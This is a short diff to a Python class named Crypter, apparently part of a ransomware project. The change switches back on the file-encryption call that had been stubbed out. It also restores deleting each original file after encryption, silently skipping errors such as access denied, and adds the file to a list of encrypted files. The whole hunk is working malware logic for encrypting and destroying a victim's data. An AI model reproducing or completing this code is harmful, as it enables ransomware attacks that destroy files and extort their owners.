@@ -171,22 +171,18 @@ class Crypter(Base.Base):
 
       # Encrypt file if less than specified file size
       if int(os.path.getsize(file)) < self.MAX_FILE_SIZE_BYTES:
-        #is_encrypted = self.Crypt.encrypt_file(file)
-        # TODO feature/decryption_threading
-        is_encrypted = True
+        is_encrypted = self.Crypt.encrypt_file(file)
       else:
         is_encrypted = False
 
       # IF encrypted, try to delete the file and add to the list
-      # TODO feature/decryption_threading
-      #if is_encrypted:
-      #  try:
-      #    os.remove(file)
-      #  # Ignore any exception, such as access denied, and continue
-      #  except:
-      #    continue
-      #  encrypted_files.append(file)
-      encrypted_files.append(file)
+      if is_encrypted:
+        try:
+          os.remove(file)
+        # Ignore any exception, such as access denied, and continue
+        except:
+          continue
+        encrypted_files.append(file)
 
     # Write out list of encrypted files
     if encrypted_files:
